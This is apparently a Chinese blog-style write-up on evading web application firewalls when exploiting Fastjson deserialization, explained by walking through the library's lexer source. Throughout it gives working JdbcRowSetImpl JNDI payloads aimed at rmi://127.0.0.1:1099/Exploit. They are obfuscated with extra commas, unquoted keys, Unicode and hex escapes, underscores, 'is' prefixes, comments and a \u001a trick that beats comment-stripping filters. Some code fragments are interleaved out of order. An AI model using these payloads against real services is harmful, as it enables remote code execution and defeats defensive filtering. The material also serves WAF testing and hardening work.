浅谈Fastjson绕waf
写在前⾯
关键时期换个⼜味，虽然是炒陈饭，但个⼈认为有⼲货的慢慢看，从最简单到⼀些个⼈认
为⽐较骚的，本⼈垃圾代码狗，没有实战经验，因⽽更多是从fastjson的词法解析部分构造混
淆
初级篇
添加空⽩字符
在 com.alibaba.fastjson.parser.JSONLexerBase#skipWhitespace
public final void skipWhitespace() {
        while(true) {
            while(true) {
                if (this.ch <= '/') {
                    if (this.ch == ' ' || this.ch == '\r' || this.ch == 
'\n' || this.ch == '\t' || this.ch == '\f' || this.ch == '\b') {
                        this.next();
                        continue;
                    }
                    if (this.ch == '/') {
不难看出默认会去除键、值外的空格、 \b 、 \n 、 \r 、 \f 等，作为开胃菜
默认开启的Feature中得到的思路
添加多个逗号  
FastJson中有个默认的Feature是开启的 AllowArbitraryCommas ，这允许我们⽤多个逗号
这⾥可以添加的位置很多
                        this.skipComment();
                        continue;
                    }
                }
                return;
            }
        }
    }
json字段名不被引号包括  
也是⼀个默认开启的Feature， AllowUnQuotedFieldNames ，但是只在恢复字段的过程调⽤
当中有效果
因此原来的payload可以做此改造
{,,,,,,"@type":"com.sun.rowset.JdbcRowSetImpl",,,,,,"dataSourceName":"rmi:
//127.0.0.1:1099/Exploit",,,,,, "autoCommit":true}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1
:1099/Exploit", "autoCommit":true}
||
\/
{"@type":"com.sun.rowset.JdbcRowSetImpl",dataSourceName:"rmi://127.0.0.1:1
099/Exploit", "autoCommit":true}
json字段名使⽤单引号包裹  
Feature.AllowSingleQuote 也是默认开启滴，这个太简单了就不说了
@type后的值第⼀个引号可以替换为其他字符  
主要是⼀个逻辑问题
这⾥我们可以对⽐之前获取 @type 的过程，先检验了当前位置是 " 再扫描到下⼀个 " 之间的
值
因此可以构造出,注意 com 前⾯的引号被我改了,
{"@type":xcom.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0
.1:1099/Exploit", "autoCommit":true}
编码绕过(Unicode/Hex)
⾸先在 com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol ,当中可以看见，
如果遇到了 \u 或者 \x会有解码操作
if (ch == '"') {
  key = lexer.scanSymbol(this.symbolTable, '"');
  lexer.skipWhitespace();
  ch = lexer.getCurrent();
//省略不必要代码
}
还可以混合编码，这⾥⼀步到位
对字段添加多个下划线或者减号
1.2.36版本前  
在 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseFie
ld
解析字段的key的时候，调⽤了 smartMatch ，下⾯截了与本主题相关的关键点
{"\x40\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourc
eName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
由于这⾥有 break ，不⽀持两个⼀起混合使⽤，只能单⼀使⽤其中⼀个，随便加
1.2.36版本及以后  
我们再来看这个 smartMatch 调⽤了
com.alibaba.fastjson.util.TypeUtils#fnv1a_64_lower
{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"rmi://127.0.
0.1:1099/Exploit", "autoCommit":true}
这个函数忽略所有的 _ 与 -
因此简单测试，lol
1.2.36版本后可以对属性前添加is
在那个基础上,还是在 smartMatch 当中可以看见，如果前缀有 is ，会去掉 is
⾼级篇
⾃⼰瞎想出来的哈哈哈，假装很⾼级吧
注释加强版绕过
我在想如果假如有waf逻辑会为了⽅便先将接受到的字符串的去除注释符之间的部分再去匹
配，⽐如下⾯的伪代码
处理前： /*y4tacker*/{/*y4tacker*/"@type":"com.sun.rowset.JdbcRowSetImpl"}
处理后会显得更⼲脆更好做判断：
{"a": {"@type": "java.lang.Class","val": 
"com.sun.rowset.JdbcRowSetImpl"},"b": {"@type": 
"com.sun.rowset.JdbcRowSetImpl","isdataSourceName": 
"rmi://127.0.0.1:1099/Exploit","isautoCommit": true}}
preg_replace("(/\*
(.*?)\*/)","",'/*y4tacker*/{/*y4tacker*/"@type":"com.sun.rowset.JdbcRowSet
Impl"}');
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0
.1:1099/Exploit", "autoCommit":true}
那有没有办法可以让我们将注释符中内容替换以后，没有危险字符嘞，当然有的，先给出答
案再解释加上 \u001a
/*\u001a{/*y4tacker*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSource
Name":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}*/ ，这样waf就会将
内容替换后识别⼀串空字符当然就可以绕过，⽽且JSON数据后⾯可以填充其他不是 ():[]{}
等任意字符，具体可以
看 com.alibaba.fastjson.parser.JSONLexerBase#nextToken()
那为什么这⾥ \u001a 可以绕过
从代码出发开局初始化 DefaultJSONParser 的时候，由于我们字符串开头是 / ，会调
⽤ netToken
这⾥会调⽤ skipComment 去除注释
可以看见如果是正常逻辑匹配到 */ 只是移动到下⼀字符返回
之后继续处理正常逻辑
题外话  
fastjson眼中的注释 /**/ ， //y4tacker\n ，具体可以看skipComment的逻辑
因此在⽀持加注释的地⽅可以试试添加打乱特征
//y4tacker\n{//y4tacker\n"@type"//y4tacker\n://y4tacker\n"com.test.Test"//
y4tacker\n}